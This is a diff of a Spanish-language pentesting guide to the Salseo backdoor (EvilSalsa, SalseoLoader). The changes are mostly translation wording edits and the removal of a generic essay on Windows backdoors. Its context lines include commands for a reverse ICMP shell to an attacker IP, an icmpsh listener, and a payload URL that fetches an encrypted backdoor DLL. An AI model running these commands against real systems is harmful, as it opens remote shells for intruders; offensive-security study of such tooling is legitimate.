@@ -16,7 +16,7 @@
 
 Descarga el código fuente de Github y compila **EvilSalsa** y **SalseoLoader**. Necesitarás tener instalado **Visual Studio** para compilar el código.
 
-Compila ambos proyectos para la arquitectura de la máquina Windows donde los vayas a usar (si Windows admite x64, compílalos para esa arquitectura).
+Compila ambos proyectos para la arquitectura de la máquina Windows donde los vayas a utilizar (si Windows admite x64, compílalos para esa arquitectura).
 
 Puedes **seleccionar la arquitectura** dentro de Visual Studio en la **pestaña "Build"** en **"Platform Target".**
 
@@ -39,31 +39,7 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 ```
 ### Windows
 
-### Introducción
-
-En este capítulo, discutiremos algunas técnicas para crear backdoors en sistemas Windows. Los backdoors son una forma de acceso no autorizado a un sistema, lo que permite a un atacante mantener el acceso a un sistema comprometido incluso después de que se hayan tomado medidas para eliminar el acceso inicial.
-
-### Creando un backdoor con Metasploit
-
-Metasploit es una herramienta de código abierto que se utiliza para desarrollar y ejecutar exploits contra sistemas informáticos. También se puede utilizar para crear backdoors en sistemas Windows.
-
-Para crear un backdoor con Metasploit, primero debemos seleccionar un exploit que nos permita obtener acceso al sistema. Una vez que hemos seleccionado un exploit, podemos utilizar Metasploit para generar un payload que se ejecutará en el sistema comprometido y nos dará acceso al sistema.
-
-### Creando un backdoor con PowerShell
-
-PowerShell es un lenguaje de scripting de Microsoft que se utiliza para administrar sistemas Windows. También se puede utilizar para crear backdoors en sistemas Windows.
-
-Para crear un backdoor con PowerShell, podemos utilizar una técnica conocida como "reflective DLL injection". Esta técnica nos permite cargar una DLL maliciosa en la memoria de un proceso legítimo, lo que nos permite ejecutar código malicioso en el contexto del proceso legítimo.
-
-### Creando un backdoor con una puerta trasera personalizada
-
-También podemos crear una puerta trasera personalizada para obtener acceso no autorizado a un sistema Windows. Para hacer esto, podemos utilizar un lenguaje de programación como C++ o C# para crear un programa que se ejecute en el sistema comprometido y nos dé acceso al sistema.
-
-Una vez que hemos creado nuestro programa, podemos utilizar técnicas de ofuscación para ocultar el programa de los programas antivirus y de seguridad del sistema. También podemos utilizar técnicas de empaquetado para comprimir el programa y hacer que sea más difícil de detectar.
-
-### Conclusión
-
-En este capítulo, hemos discutido algunas técnicas para crear backdoors en sistemas Windows. Es importante recordar que el uso de estas técnicas para obtener acceso no autorizado a un sistema es ilegal y puede resultar en consecuencias graves. Siempre debemos utilizar estas técnicas con fines educativos y éticos.
+Windows
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -101,7 +77,7 @@ sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
-#### Dentro de la víctima, ejecutemos la técnica salseo:
+#### Dentro de la víctima, ejecutemos la cosa salseo:
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
@@ -115,13 +91,13 @@ Abre el proyecto SalseoLoader usando Visual Studio.
 
 ### Instala DllExport para este proyecto
 
-#### **Herramientas** --> **Gestor de paquetes NuGet** --> **Administrar paquetes NuGet para la solución...**
+#### **Herramientas** --> **Administrador de paquetes NuGet** --> **Administrar paquetes NuGet para la solución...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1).png>)
 
 #### **Busca el paquete DllExport (usando la pestaña Examinar) y presiona Instalar (y acepta el mensaje emergente)**
 
-![](<../.gitbook/assets/image (4) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (4) (1) (1) (1) (1).png>)
 
 En la carpeta de tu proyecto aparecerán los archivos: **DllExport.bat** y **DllExport\_Configure.bat**
 
@@ -129,11 +105,11 @@ En la carpeta de tu proyecto aparecerán los archivos: **DllExport.bat** y **Dll
 
 Presiona **Desinstalar** (sí, es extraño, pero confía en mí, es necesario)
 
-![](<../.gitbook/assets/image (5) (1) (1) (2).png>)
+![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)
 
-### **Cierra Visual Studio y ejecuta DllExport\_configure**
+### **Sal de Visual Studio y ejecuta DllExport\_configure**
 
-Simplemente **cierra** Visual Studio
+Simplemente **sal** de Visual Studio
 
 Luego, ve a tu carpeta de **SalseoLoader** y **ejecuta DllExport\_Configure.bat**
 
@@ -141,7 +117,7 @@ Selecciona **x64** (si lo vas a usar dentro de una caja x64, ese fue mi caso), s
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1).png>)
 
-### **Abre el proyecto nuevamente con Visual Studio**
+### **Abre el proyecto de nuevo con Visual Studio**
 
 **\[DllExport]** ya no debería estar marcado como error
 
@@ -184,7 +160,7 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-CMD (Command Prompt) es una herramienta de línea de comandos en sistemas operativos Windows que permite a los usuarios interactuar con el sistema operativo mediante comandos. Los comandos CMD pueden ser utilizados para realizar diversas tareas, como la gestión de archivos y directorios, la configuración de redes y la ejecución de programas. Los hackers pueden utilizar CMD para ejecutar comandos maliciosos y crear backdoors en sistemas Windows comprometidos.
+CMD (Command Prompt) es una herramienta de línea de comandos en sistemas operativos Windows que permite a los usuarios interactuar con el sistema operativo mediante comandos. Los comandos CMD pueden ser utilizados para realizar diversas tareas, como la gestión de archivos y directorios, la configuración de redes, la ejecución de programas y la solución de problemas de sistema. Los hackers pueden utilizar CMD para ejecutar comandos maliciosos y crear backdoors en sistemas comprometidos.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
